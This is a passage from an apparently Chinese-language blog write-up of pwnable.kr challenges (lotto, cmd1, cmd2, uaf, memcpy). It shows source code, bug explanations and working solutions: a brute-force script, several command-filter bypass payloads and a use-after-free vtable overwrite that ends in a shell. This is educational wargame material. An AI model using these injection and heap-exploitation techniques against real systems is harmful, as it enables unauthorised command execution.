class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-12">题目解析</h3>
<p>程序从<code>/dev/urandom</code>中读取6个字节随机数，与用户输入的数据进行对比，而问题就出在对比的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">			match++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序写成了嵌套循环，结果导致只要有一次lotto[i]==submit[j]，match++就可以加到6，最后得到flag。那么就随便挑个字符，然后爆破就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(<span class="string">"lotto"</span>,<span class="string">"pwnable.kr"</span>,<span class="number">2222</span>,<span class="string">"guest"</span>)</span><br><span class="line">p=s.process(<span class="string">"/home/lotto/lotto"</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    payload=<span class="string">"------"</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    recv_str=p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"bad luck...\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> recv_str:</span><br><span class="line">        <span class="keyword">print</span> recv_str</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="cmd1">cmd1</h2>
<h3 id="题目描述-13">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-13">题目解析</h3>
<p>程序执行用户输入的命令，但是设置了一个不存在的path环境变量<code>/thankyouverymuch</code>，并且对输入进行了过滤，不能输入sh，flag，tmp。</p>
<p>环境变量部分只需要带上路径访问就可以，过滤部分则需要利用linux的通配符，或者可以将"flag"拆分开</p>
<p>payload：</p>
<p><code>./cmd1 "/bin/cat fl*"</code></p>
<p>或者</p>
<p><code>./cmd1 “/bin/cat \”f\”\”l\”\”a\”\”g\””</code></p>
<h2 id="cmd2">cmd2</h2>
<h3 id="题目描述-14">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>** p;</span><br><span class="line">	<span class="keyword">for</span>(p=environ; *p; p++)	<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	delete_env();</span><br><span class="line">	putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-14">题目解析</h3>
<p>比起上一道题目难了许多，最麻烦的就是过滤了/，不能再<code>/bin/cat fl*</code>，当然还是有办法绕过。</p>
<ul>
<li><p><strong>pwd方式</strong></p>
<p>虽然因为程序设置了PATH导致无法执行很多命令，但是发现可以执行pwd，有两种方法</p>
<ol type="1">
<li><p>进入到根目录<code>/</code>,此时pwd返回的结果就是<code>/</code>，利用<code>$(pwd)</code>就可以得到<code>/</code>接着构造payload：</p>
<p><code>/home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*'</code></p></li>
<li><p>首先在tmp目录下创建目录<code>/tmp/test/c</code>，这样在此目录下执行pwd会得到<code>/tmp/test/c</code>，接着在<code>/tmp/test</code>目录下建立cat的软连接：<code>ln -s /bin/cat cat</code>，在<code>/tmp/test/c</code>下建立flag的软连接：<code>ln -s /home/cmd2/flag flag</code>，然后在<code>/tmp/test/c</code>目录下执行命令：<code>/home/cmd2/cmd2 "$(pwd)at f*"</code></p></li>
</ol></li>
<li><p>编码方式</p>
<ol type="1">
<li><p>BASE64</p>
<p>首先将<code>/bin/cat /home/cmd2/flag</code>进行base64编码，得到<code>L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnCg==</code>，但是因为有=，所以需要在原来的字符串中插入两个空格，就不会有=了。</p>
<p><code>echo "\57"</code>可以输出<code>/</code>，利用管道符进行解码，最后就可以得到flag</p>
<p><code>./cmd2 '$(echo "L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnICAK" | $(echo "\57")usr$(echo "\57")bin$(echo "\57")base64 -d)'</code></p></li>
<li><p>8进制</p>
<p>算出<code>/bin/cat flag</code>8进制代码，得到<code>\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</code>，接着执行<code>./cmd2 '$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")'</code></p></li>
</ol></li>
<li><p>脑洞大开方式</p>
<ol type="1">
<li><p>利用read写入环境变量并执行</p>
<p>执行<code>./cmd2 "read a;\$a"</code>，输入<code>/bin/cat flag</code>得到flag</p>
<p><code>read a;</code>写入一个a变量，<code>\$a</code>转义<code>$</code>字符，执行<code>$a</code>变量。</p></li>
<li><p>shell内置函数command的参数<code>-p</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./cmd2 <span class="string">"command -p cat \"f\"l\"a\"g"</span></span><br></pre></td></tr></table></figure></li>
</ol></li>
</ul>
<h2 id="uaf">uaf</h2>
<h3 id="题目描述-15">题目描述</h3>
<blockquote>
<p>Mommy, what is Use After Free bug?</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">	Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(op)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				m-&gt;introduce();</span><br><span class="line">				w-&gt;introduce();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">				data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">				read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="keyword">delete</span> m;</span><br><span class="line">				<span class="keyword">delete</span> w;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-15">题目解析</h3>
<p>这道题目很明显是Use-After-Free(UAF)漏洞，case3中<code>delete m;delete w</code>，但是之后再case1中可以再调用<code>m-&gt;introduce();w-&gt;introduce();</code>，触发漏洞。</p>
<p>首先了解下<a href="%5Bhttps://baike.baidu.com/item/%E8%99%9A%E5%87%BD%E6%95%B0%5D(https://baike.baidu.com/item/虚函数)">C++虚函数</a></p>
<p>虚函数，一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>
<p>调试得到<code>give_shell</code>地址后就需要想办法调用，这里就利用到UAF</p>
<p>但是利用之前需要控制被释放的空间里的内容，case2中有read函数可以利用，但是并不能控制写往什么地址。这里就需要了解下<strong><a href="https://www.freebuf.com/news/88660.html" target="_blank" rel="noopener">fastbin</a></strong></p>
<blockquote>
<p>fastbin顾名思义，fast就是要快。所以fastbin旨在加快操作系统的内存分配速度，fastbin仅使用fd形成单链表的形式，且遵循LIFO原则。</p>
<p>当操作系统分配一块较小的内存时(64字节)，会首先从从fastbin中寻找未使用的chunk并分配。</p>
</blockquote>
<p>w，m对象的内存布局为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|   vtable   |&lt;----------------+</span><br><span class="line">+------------+                 | </span><br><span class="line">|    age     |        +------------------+</span><br><span class="line">+------------+        | human::give_shell|</span><br><span class="line">|    name    |        +------------------+</span><br><span class="line">+------------+        |  man::introduce  |</span><br><span class="line">      ^               +------------------+</span><br><span class="line">      |</span><br><span class="line">+------------+                 </span><br><span class="line">|   &quot;jack&quot;   |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
<p>大小为24字节，属于fastbin。执行delete之后，如果case2中分配的空间大小为24字节，就可以重新分配到这一块内存区域。</p>
<p><strong>payload</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uaf@prowl:~$ python -c <span class="string">'print "\x48\x15\x40\x00\x00\x00\x00\x00"'</span>&gt;/tmp/uaf_exp1</span><br><span class="line">uaf@prowl:~$ ./uaf 24 /tmp/uaf_exp1</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">3</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2          <span class="comment">#分配两次，因为程序先delete m,后delete w，只分配一次会先分配到w上面，而case1是先执行m-&gt;introduce()。</span></span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">1</span><br><span class="line">$ ls</span><br><span class="line">flag  uaf  uaf.cpp</span><br><span class="line">$ cat flag</span><br><span class="line">yay_f1ag_aft3r_pwning</span><br></pre></td></tr></table></figure>
<h2 id="memcpy">memcpy</h2>
<h3 id="题目描述-16">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">"rdtsc"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">		dest[i] = src[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> i;</span><br><span class="line">	<span class="comment">// 64-byte block fast copy</span></span><br><span class="line">	<span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">		i = len / <span class="number">64</span>;</span><br><span class="line">		len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			__asm__ __volatile__ (</span><br><span class="line">			<span class="string">"movdqa (%0), %%xmm0\n"</span></span><br><span class="line">			<span class="string">"movdqa 16(%0), %%xmm1\n"</span></span><br><span class="line">			<span class="string">"movdqa 32(%0), %%xmm2\n"</span></span><br><span class="line">			<span class="string">"movdqa 48(%0), %%xmm3\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm0, (%1)\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm1, 16(%1)\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm2, 32(%1)\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm3, 48(%1)\n"</span></span><br><span class="line">			::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</span><br><span class="line">			dest += <span class="number">64</span>;</span><br><span class="line">			src += <span class="number">64</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// byte-to-byte slow copy</span></span><br><span class="line">	<span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line">	<span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hey, I have a boring assignment for CS class.. :(\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The assignment is simple.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- What is the best implementation of memcpy?        -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- 1. implement your own slow/fast version of memcpy -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- 2. compare them with various size of data         -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- 3. conclude your experiment and submit report     -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This time, just help me out with my experiment and get flag\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No fancy hacking, I promise :D\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line">	<span class="keyword">int</span> e;</span><br><span class="line">	<span class="keyword">char</span>* src;</span><br><span class="line">	<span class="keyword">char</span>* dest;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">	<span class="comment">// allocate memory</span></span><br><span class="line">	<span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// setup experiment parameters</span></span><br><span class="line">	<span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;	<span class="comment">// 2^13 = 8K</span></span><br><span class="line">		low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">		high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"specify the memcpy amount between %d ~ %d : "</span>, low, high);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">		<span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"don't mess with the experiment.\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		sizes[i++] = size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ok, lets run the experiment with your configuration\n"</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// run experiment</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">		size = sizes[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"experiment %d : memcpy with buffer size %d\n"</span>, i+<span class="number">1</span>, size);</span><br><span class="line">		dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></span><br><span class="line">		t1 = rdtsc();</span><br><span class="line">		slow_memcpy(dest, src, size);		<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">		t2 = rdtsc();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></span><br><span class="line">		t1 = rdtsc();</span><br><span class="line">		fast_memcpy(dest, src, size);		<span class="comment">// block-to-block memcpy</span></span><br><span class="line">		t2 = rdtsc();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"thanks for helping my experiment!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"flag : ----- erased in this source code -----\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-16">题目解析</h3>
<p>这个程序的作用就是测试自己实现的两个函数<code>slow_memcpy</code>和<code>fast_memcpy</code>的速度，<code>slow_memcpy</code>使用的是逐字节赋值，<code>fast_memcpy</code>就比较麻烦了，使用的是内嵌汇编<code>movdqa</code>和<code>movntps</code>指令，当程序测试完之后就会直接输出flag。</p>
<p>直接运行程序，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">specify the memcpy amount between 8 ~ 16 : 8</span><br><span class="line">specify the memcpy amount between 16 ~ 32 : 16</span><br><span class="line">specify the memcpy amount between 32 ~ 64 : 32</span><br><span class="line">specify the memcpy amount between 64 ~ 128 : 64</span><br><span class="line">specify the memcpy amount between 128 ~ 256 : 128</span><br><span class="line">specify the memcpy amount between 256 ~ 512 : 256</span><br><span class="line">specify the memcpy amount between 512 ~ 1024 : 512</span><br><span class="line">specify the memcpy amount between 1024 ~ 2048 : 1024</span><br><span class="line">specify the memcpy amount between 2048 ~ 4096 : 2048</span><br><span class="line">specify the memcpy amount between 4096 ~ 8192 : 4096</span><br><span class="line">ok, lets run the experiment with your configuration</span><br><span class="line">experiment 1 : memcpy with buffer size 8</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 2162</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 244</span><br><span class="line"></span><br><span class="line">experiment 2 : memcpy with buffer size 16</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 358</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 254</span><br><span class="line"></span><br><span class="line">experiment 3 : memcpy with buffer size 32</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 382</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 484</span><br><span class="line"></span><br><span class="line">experiment 4 : memcpy with buffer size 64</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 618</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 168</span><br><span class="line"></span><br><span class="line">experiment 5 : memcpy with buffer size 128</span><br><span class="line">ellapsed CPU cycles for 